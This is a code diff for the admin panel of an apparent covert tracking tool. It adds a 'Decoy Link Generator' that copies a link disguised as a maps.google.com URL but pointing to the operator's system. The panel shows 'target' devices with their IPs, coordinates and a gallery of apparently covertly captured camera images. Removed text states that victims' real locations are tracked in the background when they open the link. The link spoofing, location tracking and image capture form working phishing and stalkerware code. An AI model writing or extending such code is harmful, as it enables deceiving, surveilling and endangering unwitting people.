@@ -17,19 +17,16 @@ interface GroupedDevice {
 
 const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
   const [selectedDevice, setSelectedDevice] = useState<GroupedDevice | null>(null);
-  const [viewHistoryDevice, setViewHistoryDevice] = useState<GroupedDevice | null>(null); // New State for History Modal
+  const [viewHistoryDevice, setViewHistoryDevice] = useState<GroupedDevice | null>(null);
   
   // Link Generator State
   const [targetLat, setTargetLat] = useState('');
   const [targetLng, setTargetLng] = useState('');
   const [generatedLink, setGeneratedLink] = useState('');
 
-  // 1. Grouping Logic: 1 User = 1 Object
+  // 1. Grouping Logic
   const devices = useMemo(() => {
     const groups: { [key: string]: GroupedDevice } = {};
-
-    // Process logs from oldest to newest so the 'latest_log' ends up being the actual latest
-    // Sort log first
     const sortedLogs = [...logs].sort((a, b) => new Date(a.created_at).getTime() - new Date(b.created_at).getTime());
 
     sortedLogs.forEach(log => {
@@ -43,27 +40,19 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
           device_info: log.device_info
         };
       }
-
-      // Update latest info
       groups[log.device_id].latest_log = log;
       groups[log.device_id].history.push(log);
-      
-      // Collect Images
       if (log.image_data) {
-        // Prevent duplicate consecutive images if needed, but for now allow all
         groups[log.device_id].images.push({
             url: log.image_data,
             timestamp: log.created_at
         });
       }
-      
-      // Update Device Info if available (sometimes early logs don't have it)
       if (log.device_info) {
         groups[log.device_id].device_info = log.device_info;
       }
     });
 
-    // Convert object to array and sort by latest activity (descending)
     return Object.values(groups).sort((a, b) => 
       new Date(b.latest_log.created_at).getTime() - new Date(a.latest_log.created_at).getTime()
     );
@@ -76,9 +65,34 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
     setGeneratedLink(link);
   };
 
-  const copyToClipboard = () => {
-    navigator.clipboard.writeText(generatedLink);
-    alert('Link copied to clipboard!');
+  // NEW: Rich Text Copy (Spoofing)
+  const copyToClipboard = async () => {
+    if (!generatedLink) return;
+
+    // The Fake Visual URL (What the user sees in the text)
+    const fakeVisualUrl = `https://maps.google.com/maps?q=${targetLat},${targetLng}`;
+    
+    try {
+        // Create both HTML (for rich text apps like WhatsApp Web, Gmail, Word) 
+        // and Plain Text (fallback)
+        const htmlContent = `<a href="${generatedLink}">${fakeVisualUrl}</a>`;
+        
+        const blobHtml = new Blob([htmlContent], { type: "text/html" });
+        const blobText = new Blob([generatedLink], { type: "text/plain" });
+
+        const data = [new ClipboardItem({
+            ["text/html"]: blobHtml,
+            ["text/plain"]: blobText
+        })];
+
+        await navigator.clipboard.write(data);
+        alert('Decoy Link Copied! \n\n[MASKING ACTIVE]\nIf you paste this into Email/WhatsApp, it will look like:\n' + fakeVisualUrl + '\n\nBut it links to your system.');
+    } catch (err) {
+        console.error("Rich copy failed", err);
+        // Fallback to simple copy
+        navigator.clipboard.writeText(generatedLink);
+        alert('Link copied (Plain Text Mode). Browser did not support masking.');
+    }
   };
 
   return (
@@ -117,13 +131,19 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
         
         {/* TOOL: Link Generator */}
         <div className="bg-white rounded-xl shadow-sm border border-slate-200 p-6">
-            <h3 className="text-sm font-bold text-slate-800 uppercase tracking-wider mb-4 border-b pb-2">
-                <i className="fa-solid fa-link mr-2 text-indigo-500"></i>
-                Target Link Generator (Decoy)
+            <h3 className="text-sm font-bold text-slate-800 uppercase tracking-wider mb-4 border-b pb-2 flex items-center justify-between">
+                <span>
+                    <i className="fa-solid fa-link mr-2 text-indigo-500"></i>
+                    Decoy Link Generator
+                </span>
+                <span className="text-[10px] bg-indigo-100 text-indigo-700 px-2 py-0.5 rounded border border-indigo-200">
+                    <i className="fa-solid fa-mask mr-1"></i>
+                    Auto-Masking Active
+                </span>
             </h3>
             <div className="flex flex-col md:flex-row gap-4 items-end">
                 <div className="w-full md:w-1/4">
-                    <label className="text-xs text-slate-500 font-semibold mb-1 block">Latitude</label>
+                    <label className="text-xs text-slate-500 font-semibold mb-1 block">Target Latitude</label>
                     <input 
                         type="number" 
                         step="any"
@@ -134,7 +154,7 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
                     />
                 </div>
                 <div className="w-full md:w-1/4">
-                    <label className="text-xs text-slate-500 font-semibold mb-1 block">Longitude</label>
+                    <label className="text-xs text-slate-500 font-semibold mb-1 block">Target Longitude</label>
                     <input 
                         type="number" 
                         step="any"
@@ -153,16 +173,21 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
                     </button>
                 </div>
                 {generatedLink && (
-                    <div className="flex-1 w-full bg-indigo-50 border border-indigo-100 rounded-lg px-3 py-2 flex items-center justify-between">
-                        <span className="text-xs text-indigo-700 truncate mr-2 font-mono">{generatedLink}</span>
-                        <button onClick={copyToClipboard} className="text-indigo-600 hover:text-indigo-800">
-                            <i className="fa-regular fa-copy"></i>
+                    <div className="flex-1 w-full bg-indigo-50 border border-indigo-100 rounded-lg px-3 py-2 flex items-center justify-between gap-3">
+                         <div className="overflow-hidden">
+                            <p className="text-[10px] text-slate-400 font-bold uppercase">Real Link:</p>
+                            <span className="text-xs text-indigo-700 truncate font-mono block">{generatedLink}</span>
+                            <p className="text-[10px] text-slate-400 font-bold uppercase mt-1">Masked as:</p>
+                            <span className="text-xs text-green-600 truncate font-mono block">https://maps.google.com/maps?q={targetLat},{targetLng}</span>
+                         </div>
+                        <button onClick={copyToClipboard} className="bg-white border border-indigo-200 text-indigo-600 hover:text-indigo-800 hover:bg-indigo-50 px-3 py-2 rounded shadow-sm text-xs font-bold whitespace-nowrap">
+                            <i className="fa-solid fa-copy mr-1"></i> Copy Decoy
                         </button>
                     </div>
                 )}
             </div>
             <p className="text-xs text-slate-400 mt-2">
-                * When a user opens this link, the map will center on these coordinates, but their real location will be tracked in the background.
+                * When copied, the link will visually appear as <b>maps.google.com</b> but will direct to this system.
             </p>
         </div>
 
@@ -214,7 +239,6 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
                                     <span className="px-2 py-1 bg-slate-100 text-slate-600 text-[10px] font-bold rounded uppercase border border-slate-200">
                                         {device.latest_log.status}
                                     </span>
-                                    {/* UPDATED: History Button */}
                                     <button 
                                         onClick={() => setViewHistoryDevice(device)}
                                         className="px-2 py-1 bg-blue-50 hover:bg-blue-100 text-blue-600 text-[10px] font-bold rounded uppercase border border-blue-100 transition-colors flex items-center gap-1.5"
@@ -305,54 +329,31 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
       {selectedDevice && (
         <div className="fixed inset-0 z-50 flex items-center justify-center bg-slate-900/95 backdrop-blur-sm p-4 animate-in fade-in duration-200">
           <div className="bg-white rounded-xl max-w-6xl w-full max-h-[90vh] flex flex-col shadow-2xl overflow-hidden">
-            
-            {/* Modal Header */}
             <div className="px-6 py-4 border-b border-slate-100 flex justify-between items-center bg-white">
                 <div>
                     <h3 className="text-lg font-bold text-slate-800">Target Gallery</h3>
                     <p className="text-xs text-slate-500 font-mono">ID: {selectedDevice.device_id}</p>
                 </div>
-                <button 
-                  onClick={() => setSelectedDevice(null)}
-                  className="w-8 h-8 rounded-full bg-slate-100 hover:bg-slate-200 flex items-center justify-center text-slate-600 transition-colors"
-                >
+                <button onClick={() => setSelectedDevice(null)} className="w-8 h-8 rounded-full bg-slate-100 hover:bg-slate-200 flex items-center justify-center text-slate-600 transition-colors">
                   <i className="fa-solid fa-xmark"></i>
                 </button>
             </div>
-
-            {/* Modal Content */}
             <div className="flex-1 overflow-y-auto p-6 bg-slate-50">
-                
-                {/* 1. Latest / Hero Image */}
                 <div className="mb-8">
                     <h4 className="text-xs font-bold text-slate-400 uppercase mb-3">Latest Capture</h4>
                     <div className="rounded-xl overflow-hidden shadow-lg border-4 border-white">
-                        <img 
-                            src={selectedDevice.images[selectedDevice.images.length - 1].url} 
-                            className="w-full h-auto max-h-[500px] object-contain bg-black"
-                            alt="Latest"
-                        />
+                        <img src={selectedDevice.images[selectedDevice.images.length - 1].url} className="w-full h-auto max-h-[500px] object-contain bg-black" alt="Latest" />
                     </div>
                 </div>
-
-                {/* 2. Grid History */}
                 {selectedDevice.images.length > 1 && (
                     <div>
-                         <h4 className="text-xs font-bold text-slate-400 uppercase mb-3">
-                            History ({selectedDevice.images.length} photos)
-                        </h4>
+                         <h4 className="text-xs font-bold text-slate-400 uppercase mb-3">History ({selectedDevice.images.length} photos)</h4>
                         <div className="grid grid-cols-2 md:grid-cols-4 lg:grid-cols-5 gap-4">
                             {[...selectedDevice.images].reverse().map((img, idx) => (
                                 <div key={idx} className="group relative rounded-lg overflow-hidden shadow-sm bg-white border border-slate-200 aspect-video">
-                                    <img 
-                                        src={img.url} 
-                                        alt={`Capture ${idx}`} 
-                                        className="w-full h-full object-cover transition-transform duration-500 group-hover:scale-110"
-                                    />
+                                    <img src={img.url} alt={`Capture ${idx}`} className="w-full h-full object-cover transition-transform duration-500 group-hover:scale-110" />
                                     <div className="absolute inset-0 bg-gradient-to-t from-black/70 via-transparent to-transparent opacity-0 group-hover:opacity-100 transition-opacity">
-                                        <span className="absolute bottom-2 right-2 text-[10px] text-white font-mono">
-                                            {new Date(img.timestamp).toLocaleTimeString()}
-                                        </span>
+                                        <span className="absolute bottom-2 right-2 text-[10px] text-white font-mono">{new Date(img.timestamp).toLocaleTimeString()}</span>
                                     </div>
                                 </div>
                             ))}
@@ -360,20 +361,14 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
                     </div>
                 )}
             </div>
-            
              <div className="px-6 py-3 border-t border-slate-100 bg-white text-right">
-                <button 
-                    onClick={() => setSelectedDevice(null)}
-                    className="px-4 py-2 bg-slate-100 hover:bg-slate-200 text-slate-700 text-sm font-bold rounded-lg transition-colors"
-                >
-                    Close Gallery
-                </button>
+                <button onClick={() => setSelectedDevice(null)} className="px-4 py-2 bg-slate-100 hover:bg-slate-200 text-slate-700 text-sm font-bold rounded-lg transition-colors">Close Gallery</button>
             </div>
           </div>
         </div>
       )}
 
-      {/* HISTORY MODAL (New) */}
+      {/* HISTORY MODAL */}
       {viewHistoryDevice && (
         <div className="fixed inset-0 z-[60] flex items-center justify-center bg-slate-900/50 backdrop-blur-sm p-4 animate-in fade-in duration-200">
             <div className="bg-white rounded-xl max-w-4xl w-full max-h-[80vh] flex flex-col shadow-2xl border border-slate-200 overflow-hidden">
@@ -384,14 +379,10 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
                         </h3>
                         <p className="text-xs text-slate-500 font-mono">Device: {viewHistoryDevice.device_id}</p>
                      </div>
-                     <button 
-                      onClick={() => setViewHistoryDevice(null)}
-                      className="w-8 h-8 rounded-full bg-white border border-slate-200 hover:bg-slate-100 flex items-center justify-center text-slate-500 transition-colors"
-                    >
+                     <button onClick={() => setViewHistoryDevice(null)} className="w-8 h-8 rounded-full bg-white border border-slate-200 hover:bg-slate-100 flex items-center justify-center text-slate-500 transition-colors">
                       <i className="fa-solid fa-xmark"></i>
                     </button>
                 </div>
-                
                 <div className="flex-1 overflow-y-auto">
                     <table className="w-full text-left text-xs text-slate-600">
                         <thead className="bg-slate-100 text-slate-500 font-bold uppercase tracking-wider sticky top-0 z-10 shadow-sm">
@@ -417,20 +408,11 @@ const AdminPanel: React.FC<AdminPanelProps> = ({ logs }) => {
                                     <td className="px-6 py-3 text-slate-500">
                                         <div className="flex flex-col gap-0.5">
                                             <span>IP: {log.ip_address}</span>
-                                            {log.image_data && (
-                                                <span className="text-[10px] text-green-600 font-bold flex items-center gap-1">
-                                                    <i className="fa-solid fa-camera"></i> Capture
-                                                </span>
-                                            )}
+                                            {log.image_data && <span className="text-[10px] text-green-600 font-bold flex items-center gap-1"><i className="fa-solid fa-camera"></i> Capture</span>}
                                         </div>
                                     </td>
                                     <td className="px-6 py-3 text-right">
-                                         <a 
-                                            href={`https://www.google.com/maps?q=${log.latitude},${log.longitude}`}
-                                            target="_blank"
-                                            rel="noreferrer"
-                                            className="inline-flex items-center px-2 py-1 bg-slate-100 hover:bg-blue-600 hover:text-white text-slate-600 rounded transition-colors text-[10px] font-bold"
-                                        >
+                                         <a href={`https://www.google.com/maps?q=${log.latitude},${log.longitude}`} target="_blank" rel="noreferrer" className="inline-flex items-center px-2 py-1 bg-slate-100 hover:bg-blue-600 hover:text-white text-slate-600 rounded transition-colors text-[10px] font-bold">
                                             View Map <i className="fa-solid fa-arrow-up-right-from-square ml-1.5"></i>
                                         </a>
                                     </td>
